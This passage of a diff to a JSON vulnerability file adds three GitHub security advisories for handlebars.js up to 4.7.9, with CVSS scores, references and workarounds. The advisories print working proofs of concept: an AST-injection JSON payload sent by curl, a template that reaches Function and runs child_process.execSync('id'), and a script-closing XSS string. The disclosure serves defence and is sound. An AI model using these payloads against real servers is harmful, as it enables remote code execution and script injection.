\"line\": 1, \"column\": 0 } },\n    \"body\": [\n      {\n        \"type\": \"BlockStatement\",\n        \"path\": {\n          \"type\": \"PathExpression\", \"data\": false, \"depth\": 0,\n          \"parts\": [\"missingHelper\"], \"original\": \"missingHelper\",\n          \"loc\": { \"start\": { \"line\": 1, \"column\": 0 } }\n        },\n        \"params\": [],\n        \"program\": {\n          \"type\": \"Program\",\n          \"blockParams\": {\n            \"length\": \"(()=\u003e{throw new Error('Injected code ran as uid ' + process.getuid())})()\"\n          },\n          \"body\": [],\n          \"loc\": { \"start\": { \"line\": 1, \"column\": 0 } }\n        },\n        \"openStrip\": { \"open\": false, \"close\": false },\n        \"inverseStrip\": { \"open\": false, \"close\": false },\n        \"closeStrip\": { \"open\": false, \"close\": false },\n        \"loc\": { \"start\": { \"line\": 1, \"column\": 0 } }\n      }\n    ]\n  }\n}\n```\n\n3. Send the request:\n\n```sh\ncurl -s -X POST 'http://127.0.0.1:2123/api/render' \\\n     -H 'Content-Type: application/json' --data-binary @poc.json\n```\n\nThe server responds with HTTP 500 and an error page showing the injected code ran inside the Node.js process:\n\n```\nError: Injected code ran as uid 1000\n```\n\n## Impact\n\nAn application is affected if untrusted input can reach `Handlebars.compile()` or `Handlebars.precompile()` as an object instead of a string. A common way this happens is passing a field from a JSON request body straight to `compile()`.\n\n- **`compile()`**: arbitrary JavaScript runs in the Node.js process with the application's privileges (remote code execution).\n- **`precompile()`**: the injected code is written into the precompiled template and runs wherever that template is loaded, for example in users' browsers.\n\n\n## Workarounds\n\n- **Validate input type** before calling `Handlebars.compile()`: ensure the argument is always a  `string`, never a plain object or JSON-deserialized value.\n  ```javascript\n  if (typeof templateInput !== 'string') {\n    throw new TypeError('Template must be a string');\n  }\n  ```\n- Use the Handlebars **runtime-only** build (`handlebars/runtime`) on the server if templates are  pre-compiled at build time; `compile()` will be unavailable.\n\n## Credits\n\n### Variant `Program.blockParams`\n- [Nick Mykhailyshyn - @whoareme](https://x.com/whoareme33)\n- [jmoritzc53 ](https://github.com/jmoritzc53)\n- [bhaswanthc ](https://github.com/bhaswanthc)\n- [dinhvaren ](https://github.com/dinhvaren)\n- [n0tra4e ](https://github.com/n0tra4e) \n- [PellaML](https://github.com/PellaML)\n- [kustundag](https://github.com/kustundag)\n- [kagebunsher](https://github.com/kagebunsher)\n- [sanmatte](https://github.com/sanmatte)\n\n### Variant `BooleanLiteral|NumberLiteral.value`\n\n- [sondt99 ](https://github.com/sondt99) Thai Son Dinh from VinSOC Labs (R\u0026D)\n- [Ahmed-Elmahgob ](https://github.com/Ahmed-Elmahgob)\n- [nikolakojic-rasit ](https://github.com/nikolakojic-rasit)\n- [vk-can](https://github.com/vk-can)\n- [shenhuanageshei](https://github.com/shenhuanageshei)\n- [kustundag](https://github.com/kustundag)\n- [kagebunsher](https://github.com/kagebunsher)\n- [ffasterss](https://github.com/ffasterss)\n\n### Variant `PathExpression.depth`\n\n- [hibrian827](https://github.com/hibrian827) Team Atlanta\n- [oss-security-shopify](https://github.com/oss-security-shopify)",
+              "id": "GHSA-8r5x-fm3f-whwj",
+              "modified": "2026-10-08T18:00:08.902906060Z",
+              "published": "2026-10-08T17:52:32Z",
+              "references": [
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/handlebars-lang/handlebars.js/security/advisories/GHSA-8r5x-fm3f-whwj"
+                },
+                {
+                  "type": "ADVISORY",
+                  "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-106446"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/handlebars-lang/handlebars.js/pull/2185"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/handlebars-lang/handlebars.js/commit/703fdcc5fd6cc8d1cc0c33cc19de40c467c4b8d2"
+                },
+                {
+                  "type": "PACKAGE",
+                  "url": "https://github.com/handlebars-lang/handlebars.js"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/handlebars-lang/handlebars.js/releases/tag/v4.7.10"
+                }
+              ],
+              "schema_version": "1.9.0",
+              "severity": [
+                {
+                  "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+                  "type": "CVSS_V3"
+                }
+              ],
+              "summary": "Handlebars: JavaScript Injection via AST Type Confusion in compile (bypass of CVE-2026-33937)"
+            },
+            {
+              "affected": [
+                {
+                  "database_specific": {
+                    "last_known_affected_version_range": "\u003c= 4.7.9",
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/10/GHSA-p8wg-vrv2-v86f/GHSA-p8wg-vrv2-v86f.json"
+                  },
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "handlebars",
+                    "purl": "pkg:npm/handlebars"
+                  },
+                  "ranges": [
+                    {
+                      "events": [
+                        {
+                          "introduced": "3.0.0"
+                        },
+                        {
+                          "fixed": "4.7.10"
+                        }
+                      ],
+                      "type": "SEMVER"
+                    }
+                  ]
+                }
+              ],
+              "aliases": [
+                "CVE-2026-106445"
+              ],
+              "database_specific": {
+                "cwe_ids": [
+                  "CWE-1289",
+                  "CWE-184"
+                ],
+                "github_reviewed": true,
+                "github_reviewed_at": "2026-10-08T17:52:26Z",
+                "nvd_published_at": "2026-10-06T20:17:26Z",
+                "severity": "CRITICAL"
+              },
+              "details": "## Summary\n\nHandlebars can expose the `Function` constructor despite its prototype-access deny list. When a template reaches `Function.prototype`, its own `constructor` property is returned before the deny list is checked. An attacker who can render a controlled template with `allowProtoMethodsByDefault: true` can inject and execute arbitrary JavaScript, leading to Remote Code Execution on the server.\n\n## Description\n\n`lookupProperty` trusts own properties:\n\n```js\nif (Object.prototype.hasOwnProperty.call(parent, propertyName)) {\n  return result;\n}\n```\n\nNormally, prototype-derived values reach `resultIsAllowed`, which blocks dangerous method names such as `constructor`. However, `constructor` is itself an own property of prototype objects:\n\n```js\nFunction.prototype.constructor === Function;\nString.prototype.constructor === String;\nObject.prototype.constructor === Object;\n```\n\nAs a result, once a template reaches `Function.prototype`, looking up `constructor` returns `Function` without consulting the deny list.\n\n## Proof of Concept\n\nAn attacker needs to reach any prototype object where constructor is an own property, then access constructor to obtain Function. The shortest path requires only an accessible function in the template context:\n\n1. Access a function's prototype: {{lookup myFunction \"proto\"}} resolves to Function.prototype. The proto property is not in the deny list and is permitted when allowProtoMethodsByDefault is true (since the result is a function).\n2. Access constructor via own property bypass: {{lookup (lookup myFunction \"\\_\\_proto__\") \"constructor\"}} resolves to Function. Because Function.prototype.constructor is an own property of Function.prototype, hasOwnProperty returns true and lookupProperty returns the value without calling resultIsAllowed. The deny list entry constructor: false is never evaluated.\n3. Construct and execute arbitrary code: The attacker uses Function to create a function with attacker-controlled body content and triggers its execution through Handlebars' template rendering mechanics (e.g., #with calling functions, lambda processing, or #each iteration combined with apply).\n\n```javascript\nconst Handlebars = require('handlebars');\n\n// constructor deny list bypass via hasOwnProperty check in lookupProperty\nconst template = Handlebars.compile(\n    // construct code array from template string literal\n    '{{#with a}}' +\n      '{{lookup \"\" (push \"return process.mainModule.require(\\'child_process\\').execSync(\\'id\\').toString()\")}}' +\n      '{{lookup \"\" (pop)}}' +\n      '{{lookup \"\" (shift)}}' +\n    '{{/with}}' +\n\n    // access Function via own property bypass on Function.prototype.constructor\n    '{{lookup \"\" (@root.a.push (lookup (lookup fn \"__proto__\") \"constructor\"))}}' +\n\n    // #each sets depth0=Function without calling it, apply avoids hash body\n    '{{#each @root}}{{#if @index}}{{else}}' +\n      '{{#with (this.apply null @root.a)}}{{this}}{{/with}}' +\n    '{{/if}}{{/each}}'\n);\n\nconst result = template(\n    { fn: function(){}, a: [0] },\n    { allowProtoMethodsByDefault: true }\n);\n\nconsole.log(result.trim());\n\n// output: uid=1000(node) gid=1000(node) groups=1000(node)\n```\n\n## Workarounds\n\nDo not set `allowProtoMethodsByDefault: true` when compiling untrusted templates with untrusted data.\n\nIf you are using packages like [hbs](https://www.npmjs.com/package/hbs) which set `allowProtoMethodsByDefault: true` by default, you have to update Handlebars to the latest version.",
+              "id": "GHSA-p8wg-vrv2-v86f",
+              "modified": "2026-10-12T14:45:06.527043960Z",
+              "published": "2026-10-08T17:52:26Z",
+              "references": [
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/handlebars-lang/handlebars.js/security/advisories/GHSA-p8wg-vrv2-v86f"
+                },
+                {
+                  "type": "ADVISORY",
+                  "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-106445"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/handlebars-lang/handlebars.js/pull/2185"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/handlebars-lang/handlebars.js/commit/ceec388abe1d1aac8f6369860d5f390fa71ef4fa"
+                },
+                {
+                  "type": "PACKAGE",
+                  "url": "https://github.com/handlebars-lang/handlebars.js"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/handlebars-lang/handlebars.js/releases/tag/v4.7.10"
+                }
+              ],
+              "schema_version": "1.9.0",
+              "severity": [
+                {
+                  "score": "CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N",
+                  "type": "CVSS_V4"
+                }
+              ],
+              "summary": "Handlebars: JavaScript Injection via Own Property Check Bypass"
+            },
+            {
+              "affected": [
+                {
+                  "database_specific": {
+                    "last_known_affected_version_range": "\u003c= 4.7.9",
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/10/GHSA-xw65-4hp5-5hc7/GHSA-xw65-4hp5-5hc7.json"
+                  },
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "handlebars",
+                    "purl": "pkg:npm/handlebars"
+                  },
+                  "ranges": [
+                    {
+                      "events": [
+                        {
+                          "introduced": "4.0.0"
+                        },
+                        {
+                          "fixed": "4.7.10"
+                        }
+                      ],
+                      "type": "SEMVER"
+                    }
+                  ]
+                }
+              ],
+              "aliases": [
+                "CVE-2026-106444"
+              ],
+              "database_specific": {
+                "cwe_ids": [
+                  "CWE-116"
+                ],
+                "github_reviewed": true,
+                "github_reviewed_at": "2026-10-08T17:52:37Z",
+                "nvd_published_at": "2026-10-06T20:17:26Z",
+                "severity": "MODERATE"
+              },
+              "details": "## Summary\n\n`Handlebars.precompile()` generates JavaScript source that is commonly embedded in browser `\u003cscript\u003e` elements. Before the fix, static template text containing `\u003c/script\u003e` was emitted unchanged. HTML parsers recognize `\u003c/script\u003e` even inside a JavaScript string literal, closing the surrounding script element and allowing following attacker-controlled markup to be parsed and executed.\n\nThis affects applications that precompile attacker-controlled templates and embed the generated source directly in an HTML `\u003cscript\u003e` element. It does not affect ordinary server-side rendering or precompiled templates delivered as external JavaScript files.\n\n## Details\n\nStatic text is serialized by `quotedString()` in `lib/handlebars/compiler/code-gen.js`. The generated JavaScript is valid, but JavaScript quoting alone does not make it safe to embed in HTML. In HTML script data, the sequence `\u003c/script\u003e` terminates the element regardless of JavaScript string context.\n\nOn affected releases, this template:\n\n```handlebars\nsafe\u003c/script\u003e\u003cscript\u003ealert(\"XSS\")\u003c/script\u003e\u003cscript\u003e\n```\n\ncould produce generated source containing:\n\n```js\nreturn 'safe\u003c/script\u003e\u003cscript\u003ealert(\"XSS\")\u003c/script\u003e\u003cscript\u003e';\n```\n\nWhen included inline in an HTML document, the first `\u003c/script\u003e` closes the script containing the precompiled template. The next `\u003cscript\u003e` element is then parsed as HTML and executes.\n\n## Proof of Concept\n\n```js\nconst Handlebars = require('handlebars');\n\nconst template = 'safe\u003c/script\u003e\u003cscript\u003ealert(\"XSS\")\u003c/script\u003e\u003cscript\u003e';\nconst output = Handlebars.precompile(template);\n\nconsole.log(output.includes('\u003c/script\u003e'));\n```\n\nAffected versions print `true`. Embedding `output` directly in an inline `\u003cscript\u003e` element allows the injected script tag to be parsed by the browser.\n\n## Workarounds\n\n- Do not inline precompiled output from untrusted templates into HTML documents.\n- Serve generated precompiled templates as external JavaScript files where practical.\n\n## Credits\n\nReported by Curly-Haired-Baboon Aka Laplas",
+              "id": "GHSA-xw65-4hp5-5hc7",
+              "modified": "2026-10-08T18:00:09.713255773Z",
+              "published": "2026-10-08T17:52:37Z",
+              "references": [
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/handlebars-lang/handlebars.js/security/advisories/GHSA-xw65-4hp5-5hc7"
+                },
+                {
+                  "type": "ADVISORY",
+                  "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-106444"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/handlebars-lang/handlebars.js/pull/2185"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/handlebars-lang/handlebars.js/commit/609d1b11c833c9a3e00f56f2f34d22f425446725"
+                },
+                {
+                  "type": "PACKAGE",
+                  "url": "https://github.com/handlebars-lang/handlebars.js"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/handlebars-lang/handlebars.js/releases/tag/v4.7.10"
+                }
+              ],
+              "schema_version": "1.9.0",
+              "severity": [
+                {
+                  "score": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:C/C:L/I:L/A:N",
+                  "type": "CVSS_V3"
+                }
+              ],
+              "summary": "Handlebars: JavaScript Injection via Unsafe Inline Embedding of Precompiled Templates"
+            }
+          ]
         },
         {
           "package": {
